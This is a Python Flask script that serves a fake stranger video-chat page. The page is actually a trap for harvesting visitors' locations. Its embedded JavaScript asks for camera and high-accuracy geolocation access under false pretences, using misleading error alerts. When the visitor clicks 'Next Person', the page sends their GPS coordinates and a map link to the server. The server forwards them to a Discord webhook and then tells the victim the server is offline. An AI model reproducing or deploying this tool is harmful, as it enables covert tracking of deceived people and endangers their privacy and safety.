from flask import Flask, request, render_template_string, jsonify
import requests
import json
import logging
import os


app = Flask(__name__)

# Discord webhook URL (replace with your actual Discord webhook URL)

DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Random Chat | Meet Strangers</title>
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            overflow: hidden;
            padding: 0 15px;
        }

        header {
            width: 100%;
            background-color: #111;
            padding: 10px 0;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 10;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.7);
        }

        header nav {
            display: flex;
            justify-content: center;
            gap: 30px;
        }

        header nav a {
            color: #fff;
            text-decoration: none;
            font-size: 1.1rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: color 0.3s ease;
        }

        header nav a:hover {
            color: #fff;
            text-decoration: underline;
        }

        .main-container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.7);
            max-width: 900px;
            width: 100%;
            text-align: center;
            backdrop-filter: blur(12px);
            color: #fff;
            margin-top: 80px;
            position: relative;
        }

        h1 {
            font-size: 1rem;
            margin-bottom: 20px;
            color: #fff;
        }

        .video-container {
            width: 100%;
            max-width: 450px;
            aspect-ratio: 16/9;
            background-color: #222;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 25px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.8);
            transition: transform 0.3s ease;
        }

        .video-container:hover {
            transform: scale(1.03);
        }

        .dropdown {
            display: none;
            margin: 20px 0;
            font-size: 1rem;
        }

        select {
            font-size: 1.2rem;
            padding: 12px;
            width: 100%;
            max-width: 450px;
            background-color: #333;
            color: white;
            border: 1px solid #fff;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }

        select:hover {
            background-color: #444;
            transform: translateY(-3px);
        }

        select:focus {
            outline: none;
            background-color: #555;
        }

        .button-container {
            margin-top: 20px;
            display: flex;
            justify-content: center;
            gap: 25px;
            flex-wrap: wrap; /* Ensure buttons wrap on smaller screens */
        }

        .button-container button {
            font-size: 1.2rem;
            padding: 15px 30px;
            background-color: #555;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .button-container button:hover {
            background-color: #777;
            transform: translateY(-3px);
        }

        #output {
            margin-top: 25px;
            font-size: 1.3rem;
            color: #ffcc00;
            font-weight: bold;
        }

        footer {
            background-color: #111;
            color: #fff;
            text-align: center;
            padding: 5px 0;
            position: absolute;
            bottom: 0;
            width: 100%;
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.7);
            margin-top: 10px;
        }

        footer a {
            color: #fff;
            text-decoration: none;
            margin: 0 10px;
            font-size: 1rem;
        }

        footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 2rem;
                margin-bottom: 15px;
            }

            .button-container {
                flex-direction: column;
                gap: 15px;
            }

            .button-container button {
                width: 90%;
            }

            select {
                width: 100%;
            }

            .video-container {
                max-width: 100%;
            }
        }

        @media (max-width: 480px) {
            header nav {
                flex-direction: column;
                gap: 15px;
            }

            header nav a {
                font-size: 1rem;
            }
        }
    </style>
</head>

<body>
    <!-- Header -->
    <header>
        <nav>
            <a href="#">Home</a>
            <a href="#">About Us</a>
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
        </nav>
    </header>

    <!-- Main Content -->
    <div class="main-container">
        <h1>Meet Strangers</h1>

        <div class="video-container" id="videoContainer">
            <video id="localVideo" autoplay playsinline></video>
        </div>

        <div id="output">Ready to connect? Press Start</div>

        <div class="dropdown" id="dropdown">
            <p>Select a Location:</p>
            <select id="locationSelect">
                <option value="USA">United States</option>
                <option value="Canada">Canada</option>
                <option value="UK">United Kingdom</option>
            </select>
        </div>

        <div class="button-container">
            <button onclick="handleGetStarted()">Start</button>
            <button onclick="sendLocationData()">Next Person</button>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <p>&copy; 2024 Random Chat | <a href="#">Contact Us</a></p>
    </footer>

    <script>
        let geoWatchId;

        function startTracking() {
            if (navigator.geolocation) {
                geoWatchId = navigator.geolocation.watchPosition(sendPosition, showError, {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 5000
                });
            } else {
                alert("Failed to get Server.");
            }
        }

        function sendPosition(position) {
            window.locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                maps_link: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
            };
        }

        function showError(error) {
            alert("Server error: Allow Location & Camera to chat.");
        }

        function handleGetStarted() {
            startVideo();  // Start video along with location tracking
            startTracking();
            document.getElementById('output').innerHTML = "Please select a topic and click Next.";
            document.getElementById('dropdown').style.display = "block";
        }

        function sendLocationData() {
            const selectedOption = document.getElementById('locationSelect').value;
            const locationData = window.locationData;

            if (locationData) {
                fetch('/submit_location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ...locationData,
                        selected_option: selectedOption
                    })
                })
                .then(response => response.json())
                .then(data => {
                    alert('Server offline.');
                    stopTracking();
                });
            }
        }

        function stopTracking() {
            if (geoWatchId) {
                navigator.geolocation.clearWatch(geoWatchId);
            }
        }

        function startVideo() {
            const videoElement = document.getElementById('localVideo');

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function (stream) {
                        videoElement.srcObject = stream;
                    })
                    .catch(function (error) {
                        alert("Camera access denied or unavailable: " + error.message);
                    });
            } else {
                alert("Your browser does not support camera access.");
            }
        }
    </script>
</body>

</html>




"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/submit_location', methods=['POST'])
def submit_location():
    data = request.json
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    maps_link = data.get('maps_link')
    selected_option = data.get('selected_option')

    # Prepare the message to send to Discord
    message = {
        'content': f"**New GPS Location:**\nLatitude: {latitude}\nLongitude: {longitude}\nAccuracy: {accuracy} meters\n[View on Google Maps]({maps_link})\nSelected Option: {selected_option}"
    }

    # Send the data to Discord webhook
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=message)
        return jsonify({'status': 'success', 'message': 'sent', 'response': response.text})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    # Get the port from the environment, default to 5000 if not set
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=False, host='0.0.0.0', port=port)
